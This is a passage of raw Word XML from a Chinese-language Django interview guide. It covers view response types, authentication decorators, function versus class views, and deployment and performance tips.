        </w:rPr>
        <w:t>加</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7127B501" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="97"/>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给类加</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="1B57CED8" w14:textId="3938C949" w:rsidR="00024E97" w:rsidRDefault="00557AFE"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003</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常用视图响应的方式有哪些</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12A6E21A" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="98"/>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常用视图响应的方式有</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>种方式</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>redirect</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Response</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>HttpResponse</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>JsonResponse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="273CCAAD"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Response({content=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>响应体</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>, content_type=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>响应体数据类型</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>, status=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>状态码</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62381068"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HttpResponse(content=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>响应体</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>, content_type=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>响应体数据类型</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>, status=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>状态码</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BDA6383"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JsonResponse({‘city’: ‘beijing’, ‘subject’: ‘python’},status=response.status_code)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24286A7D"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redirect(‘/index.html’)</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="3D8A0557" w14:textId="064A6682" w:rsidR="00024E97" w:rsidRDefault="00557AFE"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004</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>在视图函数中，常用的验证装饰器有哪些？</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="12000" w:type="dxa"/>
        <w:jc w:val="center"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3485"/>
        <w:gridCol w:w="8515"/>
      </w:tblGrid>
      <w:tr w:rsidR="00024E97" w14:paraId="018ACF8B" w14:textId="77777777" w:rsidTr="00077AF1">
        <w:trPr>
          <w:tblHeader/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="348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72FBC2D4" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="002437D1">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>装饰器</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="851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F6E3241" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="002437D1">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>用途</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00024E97" w14:paraId="13AC9474" w14:textId="77777777" w:rsidTr="00077AF1">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="34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548B880"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@login_required()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="851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1DAD867"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检查用户是否通过身份验证</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00024E97" w14:paraId="5CAB38A2" w14:textId="77777777" w:rsidTr="00077AF1">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="34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EC7DFFC"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@group_required()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="851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4E8A914"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检查用户是否属于有权限的用户组访问</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00024E97" w14:paraId="7188AB53" w14:textId="77777777" w:rsidTr="00077AF1">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="34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FA88CEC"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@anonymous_required()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="851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0330D0D"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检验用户是否已经登录</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00024E97" w14:paraId="7867875D" w14:textId="77777777" w:rsidTr="00077AF1">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="34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32175E2"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@superuser_only()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="851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5B413C6"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它只允许超级用户才能访问视图</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00024E97" w14:paraId="72615B4C" w14:textId="77777777" w:rsidTr="00077AF1">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="34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6C10554"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lastRenderedPageBreak/>
              <w:t>@ajax_required</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="851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5F63BD0"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用于检查请求是否是AJAX请求</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00024E97" w14:paraId="290FE58F" w14:textId="77777777" w:rsidTr="00077AF1">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="34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BF8706B"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@timeit</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="851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4FD6B73" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="002437D1">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>用于改进某个视图的响应时间，或者只想知道运行需要多长时间</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="61E65D10" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00D96E02" w:rsidP="00024E97">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="192" w:after="192" w:line="400" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId38" w:history="1"/>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>05.</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>视图函数和视图类的区别？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D8D1EE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 | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>优点</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>缺点</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> ---|---|--- </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09E779E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视图函数</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>容易实现跟理解；流程简单；直接使用装饰器</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>|</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>代码难以重用；处理</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>请求时要有分支表达式</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="103D7C86"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视图类</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>易拓展跟代码重用；可以用混合类继承；单独用类方法处理</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>请求；有许多内置的通用视图函数</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>|</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>不容易去理解；代码流程负载；父类混合类中隐藏较多代码；使用装饰器时需要额外的导入或覆盖方法</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="21DEEB16" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="00024E97">
      <w:pPr>
        <w:widowControl/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="4" w:color="EEEEEE"/>
        </w:pBdr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="600" w:lineRule="exact"/>
        <w:contextualSpacing/>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高阶</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FED6CA0"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01.Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>如何实现高并发？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="526D3AD2" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="99"/>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Nginx + uWSGI + Django</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43767E81" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="99"/>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Nginx + gunicorn + gevent + Django</w:t>
      </w:r>
      <w:hyperlink r:id="rId39" w:history="1"/>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="33DFEA23"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02.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>如何提高</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>应用程序的性能？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3026214C"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前端优化：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41D83F9E" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10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减少</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> http </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>请求，减少数据库的访问量，比如使用雪碧图。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="200D7687" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10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使用浏览器缓存，将一些常用的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> css</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>js</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">logo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>图标，这些静态资源缓存到本地浏览器，通过设置</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> http </w:t>
      </w:r>
      <w:r>
        <w:rPr>
